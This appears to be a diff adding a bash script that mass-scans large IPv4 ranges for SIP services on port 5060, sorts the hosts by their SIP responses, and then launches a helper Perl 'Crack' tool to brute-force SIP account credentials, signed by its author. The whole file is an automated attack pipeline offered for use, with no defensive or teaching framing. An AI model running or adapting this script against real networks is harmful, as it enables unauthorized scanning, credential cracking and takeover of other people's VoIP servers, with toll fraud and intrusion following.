@@ -1,0 +1,156 @@
+#!/bin/bash
+
+# Scan IPv4 range on ports
+echo -e "\nStart scanning ...\n"
+
+# Veriables for Svm
+
+VAR0=190
+VAR1=191
+VAR2=192
+VAR3=193
+VAR4=194
+VAR5=195
+VAR6=200
+VAR7=201
+VAR8=202
+VAR9=203
+VAR10=204
+VAR11=205
+VAR12=206
+VAR13=207
+VAR14=208
+VAR15=209
+VAR16=210
+VAR17=211
+VAR18=212
+VAR19=213
+VAR20=214
+VAR21=215
+VAR22=216
+VAR23=217
+
+
+./ss 5060 -a $VAR1 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR1.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR2 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR2.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR3 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR3.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR4 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR4.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR5 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR5.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR6 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR6.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR7 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR7.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR8 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR8.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR9 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR9.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR10 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR10.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR11 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR11.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR12 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR12.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR13 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR13.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR14 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR14.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR15 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR15.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR16 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR16.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR17 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR17.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR18 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR18.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR19 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR19.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR20 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR20.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR21 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR21.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR22 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR22.txt
+rm bios.txt # remove the bios file
+./ss 5060 -a $VAR23 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>VAR23.txt
+rm bios.txt # remove the bios file
+sleep 1
+cat VAR1.txt VAR2.txt VAR3.txt VAR4.txt VAR5.txt VAR6.txt VAR7.txt VAR8.txt VAR9.txt VAR10.txt VAR11.txt VAR12.txt VAR13.txt VAR14.txt VAR15.txt VAR16.txt VAR17.txt VAR18.txt VAR19.txt VAR20.txt VAR21.txt VAR22.txt VAR23.txt >> IPSx
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" IPSx >>IPS
+rm VAR1.txt # remove the file
+rm VAR2.txt # remove the file
+rm VAR3.txt # remove the file
+rm VAR4.txt # remove the file
+rm VAR5.txt # remove the file
+rm VAR6.txt # remove the file
+rm VAR7.txt # remove the file
+rm VAR8.txt # remove the file
+rm VAR9.txt # remove the file
+rm VAR10.txt # remove the file
+rm VAR11.txt # remove the file
+rm VAR12.txt # remove the file
+rm VAR13.txt # remove the file
+rm VAR14.txt # remove the file
+rm VAR15.txt # remove the file
+rm VAR16.txt # remove the file
+rm VAR17.txt # remove the file
+rm VAR18.txt # remove the file
+rm VAR19.txt # remove the file
+rm VAR20.txt # remove the file
+rm VAR21.txt # remove the file
+rm VAR22.txt # remove the file
+rm VAR23.txt # remove the file
+rm IPSx # remove the file
+sleep 1
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+perl run IPS
+cat 403.pal 404.pal >> ipSIP
+rm IPS # remove the file IPS
+sleep 2
+
+echo -e "\nEnding Responses !\n"
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 1000 2 ipSIP
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+sleep 2
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
